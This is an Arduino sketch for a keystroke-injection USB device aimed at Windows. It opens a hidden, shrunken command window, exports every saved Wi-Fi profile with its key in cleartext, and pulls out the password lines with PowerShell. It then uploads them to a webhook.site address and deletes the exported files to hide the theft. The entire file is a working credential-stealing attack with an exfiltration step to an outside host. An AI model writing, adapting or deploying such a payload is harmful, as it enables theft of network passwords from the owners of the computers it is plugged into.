#include <Keyboard.h>

void setup() {

  Keyboard.begin();
  Keyboard.write(0xB0);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.write(KEY_ESC);
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  Keyboard.write(KEY_ESC);
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(300);
  //super smol cmd : )
  Keyboard.println("cmd /k mode con: cols=50 lines=1");
  //Keyboard.println("cmd");
  Keyboard.write(0xB0);
  delay(300);
  Keyboard.println("cd %temp%");
  Keyboard.write(0xB0);
  delay(300);
  Keyboard.println("netsh wlan export profile key=clear");
  Keyboard.write(0xB0);
  delay(500);
  Keyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-FiPASS.txt");
  Keyboard.write(0xB0);
  delay(300);
  Keyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/[YOUR_ID] -Method POST -InFile Wi-FiPASS.txt -ContentType: text/plain");
  Keyboard.write(0xB0);
  delay(3000);
  Keyboard.println("del WI-Fi*");
  Keyboard.write(0xB0);
  delay(300);
  Keyboard.println("exit");
  Keyboard.write(0xB0);
  Keyboard.end();
}

void loop() {

}
